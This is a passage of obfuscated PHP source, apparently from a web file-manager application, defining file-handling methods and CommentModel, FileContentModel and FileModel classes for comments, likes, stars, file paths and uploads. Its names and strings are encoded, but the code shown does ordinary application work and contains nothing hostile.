$ÑŠ­²«ı, $ÓÁÚµ‹‰ = array(), $ÕÁêËŸ = '', $Ó“Ó¾ƒ) { $äÍõã¼ä =& $_SERVER[§ŒØóıü]; $Ë±…¾‰ô = $this->parse($ÒÅÉ¹¢); $ÕÁêËŸ = empty($ÕÁêËŸ) ? $Ë±…¾‰ô[$äÍõã¼ä[84]] : $ÕÁêËŸ; $ğ­±‚—ì = $this->model->addFileByRemote($Ë±…¾‰ô[$äÍõã¼ä[399]], $ÑŠ­²«ı, $ÕÁêËŸ, $ÓÁÚµ‹‰, $Ó“Ó¾ƒ); return $this->getPathOuter($ğ­±‚—ì); } public function uploadLink($²ò›¶—è, $¼¬ó¾µˆ = 0) { $šÔÆ‰î€ =& $_SERVER[§ŒØóıü]; $ŠŒ ³¬Æ = $this->parse($²ò›¶—è); $Ñ‚··¢æ = _get($GLOBALS[$šÔÆ‰î€[7]], $šÔÆ‰î€[1347]); $ö¤ÙÌİÓ = _get($GLOBALS[$šÔÆ‰î€[7]], $šÔÆ‰î€[1348]); $²ò›¶—è = Model($šÔÆ‰î€[601])->createFileName($ŠŒ ³¬Æ[$šÔÆ‰î€[84]], $Ñ‚··¢æ, $ö¤ÙÌİÓ); return IO::uploadLink($²ò›¶—è, $¼¬ó¾µˆ); } public function fileNameAuto($•†ˆ¾‚í, $×––Ö¨, $¶˜ûù = REPEAT_REPLACE, $È—™§Ûº = false) { return $this->model->fileNameAuto($•†ˆ¾‚í, $×––Ö¨, $¶˜ûù, $È—™§Ûº); } public function fileNameExist($Ì©ö½££, $¦İ€ˆ¤ø) { return $this->model->fileNameExist($Ì©ö½££, $¦İ€ˆ¤ø); } protected function _fileOut($ê†Óï‘¨, $®éÉß§à = false, $‚Ø´Ü·» = false, $¹§ã‰Ğí = '', $äÃ¾«üò = false) { $š…¦Õ =& $_SERVER[§ŒØóıü]; $œé—Ğò” = $this->model->sourceInfo($ê†Óï‘¨); if ($œé—Ğò”[$š…¦Õ[410]] == $š…¦Õ[88]) { header($š…¦Õ[1349]); die; } $¼úœ¾Ãƒ = $this->model->fileInfoGet($ê†Óï‘¨); $¹§ã‰Ğí = $¼úœ¾Ãƒ[$š…¦Õ[176]] ? $¼úœ¾Ãƒ[$š…¦Õ[176]] : $¹§ã‰Ğí; $°Ğƒ¾¹ = isset($GLOBALS[$š…¦Õ[1350]]) ? $GLOBALS[$š…¦Õ[1350]] : $œé—Ğò”[$š…¦Õ[32]]; if ($äÃ¾«üò) { return IO::fileOutServer($¼úœ¾Ãƒ[$š…¦Õ[84]], $®éÉß§à, $°Ğƒ¾¹, $¹§ã‰Ğí); } IO::fileOut($¼úœ¾Ãƒ[$š…¦Õ[84]], $®éÉß§à, $°Ğƒ¾¹, $¹§ã‰Ğí); } public function fileOut($¼¿©ñ¥, $Å¡±Öä = false, $¡Ì© ¤Õ = false, $õÁ¡«˜ = '') { $this->_fileOut($¼¿©ñ¥, $Å¡±Öä, $¡Ì© ¤Õ, $õÁ¡«˜); } public function fileOutServer($ûÁôÆ¹Í, $Ğõéø‚± = false, $æÕÖş‹ê = false, $©ÁÁ›è³ = '') { $this->_fileOut($ûÁôÆ¹Í, $Ğõéø‚±, $æÕÖş‹ê, $©ÁÁ›è³, !0); } protected function _fileOutImage($×¿¥’ØŸ, $¼‹ÃšöÆ = 250) { $¨¼±÷÷  =& $_SERVER[§ŒØóıü]; $ÈşÅ’¬ = $this->model->pathInfo($×¿¥’ØŸ); if ($ÈşÅ’¬[$¨¼±÷÷ [410]] == $¨¼±÷÷ [88]) { show_json($¨¼±÷÷ [1351] . $×¿¥’ØŸ, !1); } $°ÛºÓığ = $this->model->fileInfoGet($×¿¥’ØŸ); $°ÛºÓığ[$¨¼±÷÷ [32]] = $ÈşÅ’¬[$¨¼±÷÷ [32]]; $°ÛºÓığ[$¨¼±÷÷ [169]] = $ÈşÅ’¬[$¨¼±÷÷ [169]]; $GLOBALS[$¨¼±÷÷ [1350]] = $°ÛºÓığ[$¨¼±÷÷ [32]]; $GLOBALS[$¨¼±÷÷ [168]] = $°ÛºÓığ; IO::fileOutImage($°ÛºÓığ[$¨¼±÷÷ [84]], $¼‹ÃšöÆ); } public function fileOutImage($ß¸ßÍÆè, $•·ƒñĞ• = 250) { $this->_fileOutImage($ß¸ßÍÆè, $•·ƒñĞ•); } public function fileOutImageServer($¬¡üåèú, $´í¬¤áè = 250) { $this->_fileOutImage($¬¡üåèú, $´í¬¤áè); } public function link($³½Àá¿á, $øÛàÓ¹Ğ = '') { $‹šˆÊÆâ = $this->model->fileInfoGet($³½Àá¿á); return IO::link($‹šˆÊÆâ[$_SERVER[§ŒØóıü][84]], $øÛàÓ¹Ğ); } protected function parse($×àó¾¬Ù) { $€Ñç“‡ =& $_SERVER[§ŒØóıü]; if (strstr($×àó¾¬Ù, $€Ñç“‡[8]) === !1) { return array($€Ñç“‡[419] => intval($×àó¾¬Ù), $€Ñç“‡[84] => $€Ñç“‡[12], $€Ñç“‡[1346] => array()); } $çªö“íª = explode($€Ñç“‡[8], trim($×àó¾¬Ù, $€Ñç“‡[8])); if (count($çªö“íª) < 2) { show_tips(clear_html($×àó¾¬Ù) . $€Ñç“‡[1352]); } return array($€Ñç“‡[419] => intval($çªö“íª[0]), $€Ñç“‡[84] => $çªö“íª[1], $€Ñç“‡[1346] => array_slice($çªö“íª, 1)); } } goto DÇ§ÆÏå—ê; cŸ´›×Íºâ: class CommentModel extends ModelBase { protected $tableName = "\143\157\x6d\155\x65\156\x74"; protected $tableMeta = array("\x74\x61\142\x6c\145\116\x61\155\145" => "\143\157\155\x6d\145\156\164\137\155\x65\164\141", "\155\x65\x74\141\106\151\145\154\144" => "\143\157\x6d\155\145\x6e\x74\x49\x44"); const TYPE_SOURCE = 1; const TYPE_SHARE = 2; const TYPE_USER = 3; const TYPE_GROUP = 4; const TYPE_TOPIC = 5; const TYPE_STAR_OFFSET = 100000000; public static $TYPEALL = array(self::TYPE_SOURCE, self::TYPE_SHARE, self::TYPE_USER, self::TYPE_GROUP, self::TYPE_TOPIC); public function addComment($ÁßÀõëÒ) { $ÛŠ¨£³Ô =& $_SERVER[§ŒØóıü]; if ($ÁßÀõëÒ[$ÛŠ¨£³Ô[1891]]) { $œ“À÷›­ = $this->where(array($ÛŠ¨£³Ô[1892] => $ÁßÀõëÒ[$ÛŠ¨£³Ô[1891]]))->find(); if (!$œ“À÷›­ || $œ“À÷›­[$ÛŠ¨£³Ô[411]] != $ÁßÀõëÒ[$ÛŠ¨£³Ô[411]] || $œ“À÷›­[$ÛŠ¨£³Ô[496]] != $ÁßÀõëÒ[$ÛŠ¨£³Ô[496]]) { return !1; } $this->where(array($ÛŠ¨£³Ô[1892] => $ÁßÀõëÒ[$ÛŠ¨£³Ô[1891]]))->setAdd($ÛŠ¨£³Ô[1893], 1); } $ÁßÀõëÒ[$ÛŠ¨£³Ô[1894]] = 0; $ÁßÀõëÒ[$ÛŠ¨£³Ô[1893]] = 0; $ÁßÀõëÒ[$ÛŠ¨£³Ô[755]] = 1; return $this->add($ÁßÀõëÒ); } public function commentCount($µä¢®…Ó, $ÔŸáª±ó, $Ÿ·ƒø = false) { $Éœ˜Â‹ =& $_SERVER[§ŒØóıü]; if (!$µä¢®…Ó) { return array(); } if (is_string($µä¢®…Ó) || is_int($µä¢®…Ó)) { $µä¢®…Ó = array($µä¢®…Ó); } $ü¤Ûµâ = array($Éœ˜Â‹[496], $Éœ˜Â‹[1895] => $Éœ˜Â‹[491]); $²Ş±¸¶ = array($Éœ˜Â‹[496] => array($Éœ˜Â‹[7], $µä¢®…Ó), $Éœ˜Â‹[411] => $ÔŸáª±ó); if ($Ÿ·ƒø) { $²Ş±¸¶[$Éœ˜Â‹[1673]] = $Ÿ·ƒø; } $•‰±ÈâÜ = $this->field($ü¤Ûµâ)->where($²Ş±¸¶)->group($Éœ˜Â‹[496])->select(); return array_to_keyvalue($•‰±ÈâÜ, $Éœ˜Â‹[496], $Éœ˜Â‹[491]); } public function starTarget($òÚúÖÔ, $êŸ®ñïÍ) { $Œ²¨ş¸Á =& $_SERVER[§ŒØóıü]; $¶¢û²œ = $òÚúÖÔ + self::TYPE_STAR_OFFSET; $Ê®¦˜ŸÌ = array($Œ²¨ş¸Á[1673] => USER_ID, $Œ²¨ş¸Á[411] => $¶¢û²œ, $Œ²¨ş¸Á[496] => $êŸ®ñïÍ); $« İşŞ = $this->where($Ê®¦˜ŸÌ)->find(); if ($« İşŞ) { return $this->where(array($Œ²¨ş¸Á[399] => $« İşŞ[$Œ²¨ş¸Á[399]]))->delete(); } $õÕÖ»¸í = array($Œ²¨ş¸Á[1891] => 0, $Œ²¨ş¸Á[1673] => USER_ID, $Œ²¨ş¸Á[755] => 1, $Œ²¨ş¸Á[760] => $Œ²¨ş¸Á[12], $Œ²¨ş¸Á[411] => $¶¢û²œ, $Œ²¨ş¸Á[496] => $êŸ®ñïÍ, $Œ²¨ş¸Á[1894] => 0, $Œ²¨ş¸Á[1893] => 0); return $this->add($õÕÖ»¸í); } public function starTargetCount($Ìç™Â¯Ã, $ÄôÜö´) { $¥åÁ£ò¼ =& $_SERVER[§ŒØóıü]; $éîË©í = $ÄôÜö´ + self::TYPE_STAR_OFFSET; $°ÉÄ“Äá = $this->commentCount($Ìç™Â¯Ã, $éîË©í); $¸è–ñ· = $this->commentCount($Ìç™Â¯Ã, $éîË©í, USER_ID); return array($¥åÁ£ò¼[1896] => $°ÉÄ“Äá, $¥åÁ£ò¼[1897] => $¸è–ñ·); } public function starTargetUserList($¤ôñ—ñ‹, $ÃúüìÖ«) { $£ŸÈ»”¢ =& $_SERVER[§ŒØóıü]; $âƒĞ‹ = $¤ôñ—ñ‹ + self::TYPE_STAR_OFFSET; $ú’îàß = array($£ŸÈ»”¢[496] => $ÃúüìÖ«, $£ŸÈ»”¢[411] => $âƒĞ‹); $©ÁìùßÁ = $this->where($ú’îàß)->count(); $øÊ ºÚ£ = array($£ŸÈ»”¢[255] => $©ÁìùßÁ, $£ŸÈ»”¢[1898] => array()); if (!$©ÁìùßÁ) { return $øÊ ºÚ£; } $ñË§Ç«­ = $this->field($£ŸÈ»”¢[1673])->where($ú’îàß)->limit(500)->select(); $ñË§Ç«­ = array_to_keyvalue($ñË§Ç«­, $£ŸÈ»”¢[12], $£ŸÈ»”¢[1673]); $øÊ ºÚ£[$£ŸÈ»”¢[1898]] = Model($£ŸÈ»”¢[504])->userListInfo($ñË§Ç«­); return $øÊ ºÚ£; } public function prasiseUserList($Å¬€ƒË¬) { $—©Éßıê =& $_SERVER[§ŒØóıü]; $Ğ»˜óàÌ = array($—©Éßıê[1899] => $Å¬€ƒË¬); $Ô³¨Şİü = $this->where($Ğ»˜óàÌ)->find(); $¯áõŞƒ = _get($Ô³¨Şİü, $—©Éßıê[1894], 0); $ÜöÃŠù­ = array($—©Éßıê[255] => $¯áõŞƒ, $—©Éßıê[1898] => array()); if (!$¯áõŞƒ) { return $ÜöÃŠù­; } $…‘Ì• = Model($—©Éßıê[1900])->field($—©Éßıê[1673])->where($Ğ»˜óàÌ)->limit(500)->select(); $…‘Ì• = array_to_keyvalue($…‘Ì•, $—©Éßıê[12], $—©Éßıê[1673]); $ÜöÃŠù­[$—©Éßıê[1898]] = Model($—©Éßıê[504])->userListInfo($…‘Ì•); return $ÜöÃŠù­; } public function remove($–‹…†–) { $ÌÒ²Ñ— =& $_SERVER[§ŒØóıü]; $Å¨¿»öç = array($ÌÒ²Ñ—[1892] => $–‹…†–); $ğ·–©Î¥ = $this->where($Å¨¿»öç)->find(); if ($ğ·–©Î¥[$ÌÒ²Ñ—[1891]]) { $this->where(array($ÌÒ²Ñ—[1892] => $ğ·–©Î¥[$ÌÒ²Ñ—[1891]]))->setAdd($ÌÒ²Ñ—[1893], -1); } return $this->where($Å¨¿»öç)->delete(); } public function edit($ˆ­‡‡•¤, $›¯Û†) { $š–»âöµ =& $_SERVER[§ŒØóıü]; $¨‘‹ÅŒÙ = array($š–»âöµ[1892] => $ˆ­‡‡•¤); return $this->where($¨‘‹ÅŒÙ)->save(array($š–»âöµ[1901] => $›¯Û†)); } public function prasise($ƒüØÒÑ) { $ıŠ„Š²Ù =& $_SERVER[§ŒØóıü]; $””îúä‡ = Model($ıŠ„Š²Ù[1902]); $ù®±Àıí = array($ıŠ„Š²Ù[1892] => $ƒüØÒÑ, $ıŠ„Š²Ù[1664] => USER_ID); $•ÎË¥şà = $””îúä‡->where($ù®±Àıí)->find(); if (!$•ÎË¥şà) { $””îúä‡->add($ù®±Àıí); $ƒïñæ = $this->where(array($ıŠ„Š²Ù[1892] => $ƒüØÒÑ))->setAdd($ıŠ„Š²Ù[1894], 1); } else { $””îúä‡->where($ù®±Àıí)->delete(); $ƒïñæ = $this->where(array($ıŠ„Š²Ù[1892] => $ƒüØÒÑ))->setAdd($ıŠ„Š²Ù[1894], -1); } return $ƒïñæ; } public function targetInfo($¬ñ«Æõ, $ûÚ¢Ê™) { $ª¦§¯Ìİ =& $_SERVER[§ŒØóıü]; $ş¼Ø“Ìè = array($ª¦§¯Ìİ[576] => $¬ñ«Æõ, $ª¦§¯Ìİ[577] => $ûÚ¢Ê™); $°û¦÷ø‘ = $this->where($ş¼Ø“Ìè)->count(); $ë¦´Ú = "\122\x49\107\110\x54\x20\112\x4f\x49\116\40{$this->tablePrefix}\x63\x6f\155\155\x65\156\x74\x5f\x70\162\141\151\x73\x65\x20\163\164\x61\x72\40\157\x6e\40\x63\157\x6d\x6d\145\x6e\164\x2e\x63\157\x6d\155\145\x6e\164\x49\104\x20\75\40\163\164\141\162\56\x63\157\155\x6d\145\156\164\111\104"; $åŒÃ™à = $this->alias($ª¦§¯Ìİ[354])->where($ş¼Ø“Ìè)->join($ë¦´Ú, $ª¦§¯Ìİ[1903])->count(); $ùãË£€Ï = array($ª¦§¯Ìİ[1904] => $°û¦÷ø‘, $ª¦§¯Ìİ[1905] => $åŒÃ™à); return $ùãË£€Ï; } public function listData($ÑÂ®é¤Œ) { $Øèğ³Ù =& $_SERVER[§ŒØóıü]; if (isset($ÑÂ®é¤Œ[$Øèğ³Ù[1906]])) { if ($ÑÂ®é¤Œ[$Øèğ³Ù[1906]]) { $ÑÂ®é¤Œ[$Øèğ³Ù[1899]] = array($Øèğ³Ù[1020], intval($ÑÂ®é¤Œ[$Øèğ³Ù[1906]])); } unset($ÑÂ®é¤Œ[$Øèğ³Ù[1906]]); } if (isset($ÑÂ®é¤Œ[$Øèğ³Ù[1907]])) { if ($ÑÂ®é¤Œ[$Øèğ³Ù[1907]]) { $ÑÂ®é¤Œ[$Øèğ³Ù[1899]] = array($Øèğ³Ù[1017], intval($ÑÂ®é¤Œ[$Øèğ³Ù[1907]])); } unset($ÑÂ®é¤Œ[$Øèğ³Ù[1907]]); } return $this->_listData($ÑÂ®é¤Œ); } private function _listData($ø³’°…) { $±®èÑŠ =& $_SERVER[§ŒØóıü]; $ÀÄİğÖ = $this->where($ø³’°…)->_makeOrder()->selectPage(100); $this->_listAppendParent($ÀÄİğÖ[$±®èÑŠ[369]]); $this->_listAppendUser($ÀÄİğÖ[$±®èÑŠ[369]]); $this->_listAppendMeta($ÀÄİğÖ[$±®èÑŠ[369]]); return $ÀÄİğÖ; } private function _makeOrder() { $´©î‘Àì =& $_SERVER[§ŒØóıü]; $øÓÕóöû = array($´©î‘Àì[1894], $´©î‘Àì[1893], $´©î‘Àì[201]); $¾Äº£à = Input::get($´©î‘Àì[457], $´©î‘Àì[7], $´©î‘Àì[423], $øÓÕóöû); $ğ½ü¢¯ = Input::get($´©î‘Àì[458], $´©î‘Àì[7], $´©î‘Àì[1666], array($´©î‘Àì[1908], $´©î‘Àì[453])); $ÙĞÄ”‰ = $¾Äº£à . $´©î‘Àì[53] . $ğ½ü¢¯; return $this->order($ÙĞÄ”‰); } private function _listAppendParent(&$ş¹ƒ¨„±) { $åÓÌÈäº =& $_SERVER[§ŒØóıü]; $ÒüÊ•Ö— = array_unique(array_to_keyvalue($ş¹ƒ¨„±, $åÓÌÈäº[12], $åÓÌÈäº[1891])); $ÒüÊ•Ö— = array_remove_value($ÒüÊ•Ö—, $åÓÌÈäº[198]); if (!$ÒüÊ•Ö—) { return; } $¦áĞ¾Ú = $this->where(array($åÓÌÈäº[1892] => array($åÓÌÈäº[7], $ÒüÊ•Ö—)))->select(); $¦áĞ¾Ú = array_to_keyvalue($¦áĞ¾Ú, $åÓÌÈäº[1899]); foreach ($ş¹ƒ¨„± as &$ı€‹¿œ¤) { if (isset($¦áĞ¾Ú[$ı€‹¿œ¤[$åÓÌÈäº[1891]]])) { $ı€‹¿œ¤[$åÓÌÈäº[1909]] = $¦áĞ¾Ú[$ı€‹¿œ¤[$åÓÌÈäº[1891]]]; } } unset($ı€‹¿œ¤); } private function _listAppendUser(&$ûÊ®Øúû) { $óíô€½ =& $_SERVER[§ŒØóıü]; $ûİŠãÌ† = array_unique(array_to_keyvalue($ûÊ®Øúû, $óíô€½[12], $óíô€½[1673])); $ûİŠãÌ† = array_remove_value($ûİŠãÌ†, $óíô€½[198]); if (count($ûİŠãÌ†) == 0) { return; } foreach ($ûÊ®Øúû as $ Øôñµ) { if (isset($ Øôñµ[$óíô€½[1909]])) { $ûİŠãÌ†[] = $ Øôñµ[$óíô€½[1909]][$óíô€½[1673]]; } } $İ¼šº‹ã = Model($óíô€½[525])->userListInfo($ûİŠãÌ†); foreach ($ûÊ®Øúû as &$ Øôñµ) { $ Øôñµ[$óíô€½[590]] = $İ¼šº‹ã[$ Øôñµ[$óíô€½[1673]]]; if (isset($ Øôñµ[$óíô€½[1909]])) { $ Øôñµ[$óíô€½[1909]][$óíô€½[590]] = $İ¼šº‹ã[$ Øôñµ[$óíô€½[1909]][$óíô€½[1673]]]; } } unset($ Øôñµ); } private function _listAppendMeta(&$òŒùÔÎç) { $—ú€ˆ =& $_SERVER[§ŒØóıü]; $Òø’¿â¾ = array_unique(array_to_keyvalue($òŒùÔÎç, $—ú€ˆ[12], $—ú€ˆ[1899])); $Òø’¿â¾ = array_remove_value($Òø’¿â¾, $—ú€ˆ[198]); if (!$Òø’¿â¾) { return; } foreach ($òŒùÔÎç as $Ä¤¼ŒÔš) { if (isset($Ä¤¼ŒÔš[$—ú€ˆ[1909]])) { $Òø’¿â¾[] = $Ä¤¼ŒÔš[$—ú€ˆ[1909]][$—ú€ˆ[1899]]; } } $šØÍÆ„× = $this->metaList($Òø’¿â¾); if (!$šØÍÆ„×) { return !1; } foreach ($òŒùÔÎç as &$Ä¤¼ŒÔš) { $Ä¤¼ŒÔš[$—ú€ˆ[466]] = $šØÍÆ„×[$Ä¤¼ŒÔš[$—ú€ˆ[1899]]]; if (isset($Ä¤¼ŒÔš[$—ú€ˆ[1909]])) { $Ä¤¼ŒÔš[$—ú€ˆ[1909]][$—ú€ˆ[466]] = $šØÍÆ„×[$Ä¤¼ŒÔš[$—ú€ˆ[1909]][$—ú€ˆ[1899]]]; } } unset($Ä¤¼ŒÔš); } private function metaList($¹ış°ì) { $¤ç—İÚ =& $_SERVER[§ŒØóıü]; if (!$¹ış°ì) { return array(); } $·èàÀŸ± = array($¤ç—İÚ[1899] => array($¤ç—İÚ[7], $¹ış°ì)); $Ã¥öÌı = Model($¤ç—İÚ[1910])->where($·èàÀŸ±)->select(); $Ã¥öÌı = array_to_keyvalue_group($Ã¥öÌı, $¤ç—İÚ[1899]); foreach ($Ã¥öÌı as $¼½½ Âá => $ŒÎ¦­ä…) { $áÖåŠ„¬ = array(); foreach ($ŒÎ¦­ä… as $³³öúŒü) { $áÖåŠ„¬[$³³öúŒü[$¤ç—İÚ[94]]] = $³³öúŒü[$¤ç—İÚ[374]]; } $Ã¥öÌı[$¼½½ Âá] = $áÖåŠ„¬; } return $Ã¥öÌı ? $Ã¥öÌı : array(); } } class FileContentModel extends ModelBase { protected $tableName = "\151\x6f\137\146\151\x6c\x65\137\143\157\156\x74\x65\x6e\x74\x73"; protected $dataAuto = array(array("\x63\162\145\x61\x74\x65\124\151\155\x65", "\x74\151\x6d\145", "\x69\156\163\x65\x72\x74", "\146\165\x6e\143\x74\151\x6f\156")); } class FileModel extends ModelBase { protected $tableName = "\x69\x6f\x5f\x66\151\154\x65"; protected $tableMeta = array("\164\x61\142\x6c\145\x4e\x61\155\x65" => "\x69\x6f\137\146\x69\154\x65\x5f\155\145\x74\141", "\155\145\164\141\x46\151\145\x6c\144" => "\146\x69\x6c\145\111\104"); public function fileInfo($âğ±­èà) { $Šà³Û²ä =& $_SERVER[§ŒØóıü]; static $îÊÑÜµ• = array(); if (!isset($îÊÑÜµ•[$âğ±­èà])) { $µÏøùı‘ = $Šà³Û²ä[1911]; $…™…±¦ = Model($Šà³Û²ä[471])->field($µÏøùı‘)->where(array($Šà³Û²ä[469] => $âğ±­èà))->find(); $îÊÑÜµ•[$âğ±­èà] = $…™…±¦; } return $îÊÑÜµ•[$âğ±­èà]; } public function addFileByContent($Èô»‹Ó = '', $êÍıÄ‘» = '') { $ÂƒŠë…û =& $_SERVER[§ŒØóıü]; $Íƒ–Ó¹ = TEMP_PATH . $ÂƒŠë…û[1912]; if (!is_dir($Íƒ–Ó¹)) { mk_dir($Íƒ–Ó¹); } $Œ°‚¿½ı = $Íƒ–Ó¹ . $ÂƒŠë…û[1913] . rand_string(16); file_put_contents($Œ°‚¿½ı, $Èô»‹Ó); $İœõğ¾Ÿ = $this->addFile($Œ°‚¿½ı, $êÍıÄ‘», !0); if (file_exists($Œ°‚¿½ı)) { @unlink($Œ°‚¿½ı); } return $İœõğ¾Ÿ; } public function createFileName($›¢ÜŞÙ›, $ØÚòæÒß = false, $¨ÈŠ¶Íå = false) { $Íéø›€Ã =& $_SERVER[§ŒØóıü]; $äÍêœíñ = IO::init($Íéø›€Ã[8]); $‹Ç’±Ñ = $this->makeFilePath($›¢ÜŞÙ›, $äÍêœíñ, $ØÚòæÒß, $¨ÈŠ¶Íå); $ã”£»Ğ = $äÍêœíñ->pathFather($‹Ç’±Ñ); static $ÏÖñ¨­† = false; $­ÅôÅª˜ = $Íéø›€Ã[1914] . md5($ã”£»Ğ); if (!$ÏÖñ¨­† && !Cache::get($­ÅôÅª˜)) { $ÏÖñ¨­† = !0; $ÂëØÌßÜ = IO::mkdir($ã”£»Ğ); if (!IO::exist($ÂëØÌßÜ . $Íéø›€Ã[803])) { IO::mkfile($ÂëØÌßÜ . $Íéø›€Ã[803]); } Cache::set($­ÅôÅª˜, 1, 3600 * 2); } return $‹Ç’±Ñ; } public function makeFilePath($êˆàğ—‡, $õ†ãÎŸ£, $ĞçşÓ„İ = false, $´øÏ¯‹Ã = false) { $»ìòŸ =& $_SERVER[§ŒØóıü]; $æÑÊ½† = Model($»ìòŸ[776])->get($»ìòŸ[1915]); $ĞÛ¶Âˆª = KodIO::defaultIO() . date($»ìòŸ[1916]); $Êæ¿˜ = $ĞÛ¶Âˆª . rand_string(5) . short_id(100); $êˆàğ—‡ = str_replace($»ìòŸ[8], $»ìòŸ[11], KodIO::clear($êˆàğ—‡)); $ÏĞå¸ í = $õ†ãÎŸ£->ext($êˆàğ—‡); if (!$êˆàğ—‡) { $æÑÊ½† = $»ìòŸ[1917]; } switch ($æÑÊ½†) { case $»ìòŸ[1918]: $Êæ¿˜ = $Êæ¿˜ . $»ìòŸ[10] . $õ†ãÎŸ£->ext($êˆàğ—‡); if ($ÏĞå¸ í == $»ìòŸ[1855]) { $Êæ¿˜ .= $»ìòŸ[1212]; } break; case $»ìòŸ[1919]: $ŞöÔ’ğ¿ = Model($»ìòŸ[776])->get($»ìòŸ[777]); $ùáó¬’ = substr(md5($»ìòŸ[778] . $ŞöÔ’ğ¿ . date($»ìòŸ[753])), 0, 8); $ÄÀŞå• = KodIO::defaultDriver(); $ĞÛ¶Âˆª = $»ìòŸ[1243] . $ÄÀŞå•[$»ìòŸ[399]] . $»ìòŸ[409] . date($»ìòŸ[1920]) . $ùáó¬’ . $»ìòŸ[8]; if ($ÏĞå¸ í == $»ìòŸ[1855]) { $êˆàğ—‡ .= $»ìòŸ[1212]; } $°ÏûÏÊ‚ = $»ìòŸ[1921] . $ĞÛ¶Âˆª . $êˆàğ—‡; CacheLock::lock($°ÏûÏÊ‚); $Êæ¿˜ = $ĞÛ¶Âˆª . $êˆàğ—‡; if (IO::exist($ĞÛ¶Âˆª . $êˆàğ—‡)) { $ˆ˜½¯µÓ = substr($êˆàğ—‡, 0, strlen($êˆàğ—‡) - strlen($ÏĞå¸ í)); $¶ı®”° = $´øÏ¯‹Ã ? substr($´øÏ¯‹Ã, 0, 5) : ($ĞçşÓ„İ ? substr($ĞçşÓ„İ, 0, 5) : rand_string(5)); $Êæ¿˜ = $ĞÛ¶Âˆª . $ˆ˜½¯µÓ . $¶ı®”° . $»ìòŸ[10] . $ÏĞå¸ í; } if (IO::isTypeObject($Êæ¿˜) && !IO::isUploadServer($Êæ¿˜)) { if (IO::exist($Êæ¿˜)) { return $Êæ¿˜; } $ø¤ÏÓ„ı = IO::setContent($Êæ¿˜, $»ìòŸ[12]); if (!$ø¤ÏÓ„ı) { show_json($»ìòŸ[1922], !1); } } CacheLock::unlock($°ÏûÏÊ‚); break; case $»ìòŸ[1917]: break; default: break; } return $Êæ¿˜; } public function addFileByRemote($¯İñ´, $ÑÕ•ï«†, $¼ƒÁÈ‘¹ = array()) { $ˆË»Ä =& $_SERVER[§ŒØóıü]; if (!IO::exist($¯İñ´)) { return !1; } $áõ‰å¿ = $¼ƒÁÈ‘¹[$ˆË»Ä[176]] ? $¼ƒÁÈ‘¹[$ˆË»Ä[176]] : $ˆË»Ä[12]; $¥¡×Ú…‚ = IO::hashMd5($¯İñ´, $áõ‰å¿); $ë¬Â¢„¼ = KodIO::defaultDriver(); $–·¸“¥Ğ = array($ˆË»Ä[545] => IO::size($¯İñ´), $ˆË»Ä[1923] => 1, $ˆË»Ä[420] => $ÑÕ•ï«†, $ˆË»Ä[814] => $ë¬Â¢„¼[$ˆË»Ä[399]], $ˆË»Ä[421] => $¯İñ´, $ˆË»Ä[1924] => $¼ƒÁÈ‘¹[$ˆË»Ä[177]] ? $¼ƒÁÈ‘¹[$ˆË»Ä[177]] : IO::hashSimple($¯İñ´), $ˆË»Ä[1925] => $¥¡×Ú…‚ ? $¥¡×Ú…‚ : $áõ‰å¿); if ($åëëï¡ = $this->addFileCheckExist($–·¸“¥Ğ[$ˆË»Ä[177]], $–·¸“¥Ğ[$ˆË»Ä[176]], $–·¸“¥Ğ[$ˆË»Ä[76]])) { return $åëëï¡; } return $this->addFileData($–·¸“¥Ğ); } private function addFileData($’„éò­µ) { $æÏ¬­“ô =& $_SERVER[§ŒØóıü]; if (!$’„éò­µ) { return !1; } $’„éò­µ[$æÏ¬­“ô[76]] = intval($’„éò­µ[$æÏ¬­“ô[76]]); if (!$’„éò­µ[$æÏ¬­“ô[76]] && strlen($’„éò­µ[$æÏ¬­“ô[177]]) > 32) { $’„éò­µ[$æÏ¬­“ô[76]] = intval(substr($’„éò­µ[$æÏ¬­“ô[177]], 32)); } $íš¯Ÿõà = $this->add($’„éò­µ); return $this->find($íš¯Ÿõà); } public function addFile($äªªØÜë, $•›»ì‘, $©Æşµô = false) { $±±×á½¸ =& $_SERVER[§ŒØóıü]; $ù‘Ö×Ş­ = IO::hashSimple($äªªØÜë); $˜½Ö†€© = IO::size($äªªØÜë); $Ö‡îÀË† = $˜½Ö†€© <= 1024 * 1024 * 10 ? IO::hashMd5($äªªØÜë) : $±±×á½¸[12]; $²ä“áŒ = $±±×á½¸[1926] . $ù‘Ö×Ş­; CacheLock::lock($²ä“áŒ); if ($Ö‡îÀË† && $ù‘Ö×Ş­) { $É®†ñ¨¹ = $this->addFileCheckExist($ù‘Ö×Ş­, $Ö‡îÀË†, $˜½Ö†€©); if ($É®†ñ¨¹) { CacheLock::unlock($²ä“áŒ); return $É®†ñ¨¹; } } $š”¡†İµ = $this->addFileMake($äªªØÜë, $˜½Ö†€©, $ù‘Ö×Ş­, $Ö‡îÀË†, $•›»ì‘, $©Æşµô); $ç¥º”Åí = $this->addFileData($š”¡†İµ); CacheLock::unlock($²ä“áŒ); if (!$Ö‡îÀË† && $ç¥º”Åí) { $this->fileMd5Check($ç¥º”Åí); } return $ç¥º”Åí; } private function fileMd5Check($¨€µ‡Šï) { $‹Ô·È… =& $_SERVER[§ŒØóıü]; $‚¥Ô‹¨Ú = array($¨€µ‡Šï[$‹Ô·È…[468]], $¨€µ‡Šï[$‹Ô·È…[84]]); $Ö¤ùÛ’‚ = $‹Ô·È…[1927] . $¨€µ‡Šï[$‹Ô·È…[84]]; $ï±¨è’ß = $‹Ô·È…[1928] . $¨€µ‡Šï[$‹Ô·È…[468]]; $ª“‚§¡ü = TaskQueue::add($‹Ô·È…[1929], $‚¥Ô‹¨Ú, $Ö¤ùÛ’‚, $ï±¨è’ß); if (!$ª“‚§¡ü) { $this->fileMd5Set($¨€µ‡Šï[$‹Ô·È…[468]], $¨€µ‡Šï[$‹Ô·È…[84]]); } else { TaskQueue::addSubmit(); } } public function fileMd5Set($İÓ”Ş, $ÊêÅı¼) { $İ¾Ó¯ºš =& $_SERVER[§ŒØóıü]; $±ë¤…Ÿ = $this->find($İÓ”Ş); if (!$±ë¤…Ÿ || $±ë¤…Ÿ[$İ¾Ó¯ºš[176]]) { return; } $ş³§µØœ = IO::hashMd5($ÊêÅı¼); if (!$ş³§µØœ) { return $İ¾Ó¯ºš[12]; } $this->where(array($İ¾Ó¯ºš[468] => $İÓ”Ş))->save(array($İ¾Ó¯ºš[176] => $ş³§µØœ)); } public function addFileMake($°ø¬›, $Ä³ô¤, $îïà¥ûÃ, $êá·³°è, $Éñ¦Èî€, $–ÈŠ«¡Ç) { 